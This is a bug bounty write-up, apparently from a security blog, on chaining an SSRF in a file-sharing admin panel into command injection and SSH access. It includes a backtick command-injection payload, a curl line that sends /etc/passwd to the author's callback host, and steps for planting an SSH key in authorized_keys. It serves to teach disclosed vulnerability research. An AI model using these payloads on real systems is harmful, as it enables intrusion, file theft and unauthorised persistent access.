---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-03_bug-bounty-write-up-from-ssrf-to-4000.md
original_filename: 2020-07-03_bug-bounty-write-up-from-ssrf-to-4000.md
title: 'Bug bounty write-up: From SSRF to $4000'
category: documents
detected_topics:
- command-injection
- ssrf
- idor
- path-traversal
- rate-limit
- automation-abuse
tags:
- imported
- documents
- command-injection
- ssrf
- idor
- path-traversal
- rate-limit
- automation-abuse
language: en
raw_sha256: 40acd865a887e6132f1fedd4dfa2fefe657662a28f673393b873c52e64ba6737
text_sha256: 96621ad070ee14b1eca004fd5ae68ff5d96063a25a3b8b87165f60b1bd212ea0
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Bug bounty write-up: From SSRF to $4000

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-03_bug-bounty-write-up-from-ssrf-to-4000.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, idor, path-traversal, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `40acd865a887e6132f1fedd4dfa2fefe657662a28f673393b873c52e64ba6737`
- Text SHA256: `96621ad070ee14b1eca004fd5ae68ff5d96063a25a3b8b87165f60b1bd212ea0`


## Content

---
title: "Bug bounty write-up: From SSRF to $4000"
page_title: "Bug bounty write-up: From SSRF to $4000 - thehackerish"
url: "https://thehackerish.com/bug-bounty-write-up-from-ssrf-to-4000/"
final_url: "https://thehackerish.com/bug-bounty-write-up-from-ssrf-to-4000/"
authors: ["thehackerish (@thehackerish)"]
bugs: ["SSRF", "RCE"]
bounty: "4,000"
publication_date: "2020-07-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4446
---

# Bug bounty write-up: From SSRF to $4000

[April 22, 2021](https://thehackerish.com/bug-bounty-write-up-from-ssrf-to-4000/) by thehackerish 

Hello ethical hackers and bug bounty hunters! Welcome to this bug bounty write-up where I show you how I found a Server-Side Request Forgery vulnerability (SSRF). Then, I will explain how I was able to escalate it to obtain a Remote Code Execution (RCE). Finally, you will see how it is possible to gain a full SSH shell on the vulnerable server.

If all this seems intimidating for you, let me tell you that you shouldn’t be; just make sure you stick with me until the end. I promise you are going to learn many things today!

## What app is this bug bounty write-up targeting?

Before diving into the details, let’s understand what the application does.

Simply put, the web application I hacked is a file-sharing system that allows users to securely exchange files. It also has an administrative panel dedicated to the administrators for management purposes. They can create users, configure internal servers and networks, etc.

To honour the responsible disclosure policy, I will not tell the name of this application. However, this does not affect what you will be learning. You can definitely apply these tips and tricks on the bug bounty programs or the penetration testing projects you are working on.

## Bug bounty write-up phase 1: Enumeration

The first phase of any security testing is Enumeration. In [my bug bounty methodology](/my-bug-bounty-methodology-and-how-i-approach-a-target), I explained what are the key questions you need to answer during this phase.

In the context of this application, I focused on the administration panel since it contained many interesting features. One of them is the possibility to configure a migration server. This feature has a multi-stage wizard.

Whenever I see a complex feature, I tend to put it at the top of the list since the developers will likely make more mistakes. And this particular case was no different!

In fact, during one of the many configuration steps, the application asks for the IP address or the hostname of the migration server. For me, I started hearing inner-voices screaming: SSRF! SSRF! SSRF!

## Bug bounty write-up phase 2: Exploiting the SSRF

### Wait…What is SSRF in the first place?

SSRF stands for Server-Side Request Forgery. It is a security vulnerability which happens if you can meet two conditions:

  1. The application initiates a request to a target server.
  2. You control part or all of the target server through user input.

SSRF can be handy to pivot inside the IT infrastructure of your target. This is possible because the vulnerable server generally runs next to neighbour systems which are not directly accessible. You can [see this in action](https://youtu.be/86Mb-sIIPlM) when I demonstrate how I accessed the APK file during the Hackerone H1-2006 CTF [challenge write-up](/capture-the-flag-writeup-for-the-h1-2006-challenge).

### Exploiting the SSRF

In the case of this web application, I simply put my web server’s hostname in the migration server’s input field. Upon hitting the Next button, I received an HTTP callback. This means that the application takes the hostname input and initiates an HTTP request to a server of my choice.

### What is the impact?

Receiving a callback is not necessarily a security issue unless the server discloses sensitive data in the request. You must test if you can reach internal assets. In other words, you should be able to access services which are not directly exposed. Unfortunately, many bug bounty hunters fall for this mistake and their reports get closed as Not Applicable to Informative.

In the case of this web application, I get different error messages depending on whether there is a service running or not, but that’s all about it! I can’t interact with those services. Therefore, this SSRF is not impactful enough.

But wait! Maybe I can run arbitrary commands and exfiltrate the results in the callback.

## Escalating to Remote Code Execution (RCE)

This time, instead of using my domain as a callback, I injected an operating system (OS) command as part of the callback subdomain. Technically, I used the payload “whoami.mycallback.server. Consequently, I got an HTTP request callback to uzer.mycallback.server !

If you don’t understand the above payload, here is what’s happening:

  1. The whoami runs the command whoami. This is possible thanks to the back-ticks around it. In this case, the command returns uzer .
  2. The server sends an HTTP callback request to my server while disclosing the result of the OS command in the subdomain part.

This is clear proof that I can successfully run OS commands on the vulnerable server, which is all good, but can I run arbitrary commands?

## Bug bounty write-up bonus: Getting a full shell

While the proof-of-concept (POC) that I have so far demonstrates impact, I wanted to be sure I’m getting the full bug bounty. To do that, I needed to prove that I can run arbitrary commands, not just single-word commands like whoami.

To achieve this, I needed to read and write files. You will understand why shortly, but for now, let’s see how we can fulfil those two requirements.

### Reading internal files

Instead of using whomai, I run curl -F ‘@/etc/passwd mycallback.server’.mycallback.server. Therefore, I exfiltrated the content of the file /etc/passwd in the POST data which I receive back on mycallback.server.

Although I was using a mal-formatted hostname syntax in my payload, I still could run the OS command since the server evaluates it before anything else.

![bug bounty write-up: reading arbitrary files](https://thehackerish.com/thpu/2020/07/image-1024x686.png)bug bounty write-up: reading arbitrary files

### Writing to internal files

To demonstrate the ability to create and edit the server’s files, I run echo test | tee /tmp/POC. Then, I fetched its content using the same technique I used to read the /etc/passwd file.

### Finally, getting the SSH shell

Because the server is running a publicly accessible SSH server, what if I could log into it without any need for a password?

To achieve this, the steps are as follow:

  1. Generate a key pair using the command ssh-keygen on my attacking machine.
  2. Append the public key to the file /home/uzer/.ssh/authorized_keys on the vulnerable server using the same technique I used earlier to write the file /tmp/POC.
  3. Log into the SSH server using my private key and the user uzer using ssh -i private.key uzer@vulnerable.server .

As a result of this clear and precise impact, the team quickly triaged my report and awarded me with the highest bounty.

![Bug bounty write-up: Getting the reward](https://thehackerish.com/thpu/2020/07/image-1-1024x131.png)Bug bounty write-up: Getting the reward

## Conclusion

Chaining vulnerabilities can be devastating. In this bug bounty write-up, you learned how to combine both SSRF and Command injection to achieve Remote Code Execution on the vulnerable server. Besides, you learned how to gain a stable shell by leveraging the exposed SSH server. Finally, you learned that it’s important to demonstrate a clear impact if you want to receive the highest bounty.

I hope you enjoyed reading this article as much as I enjoyed writing it. Until the next episode, stay curious, keep learning and go find some bugs.
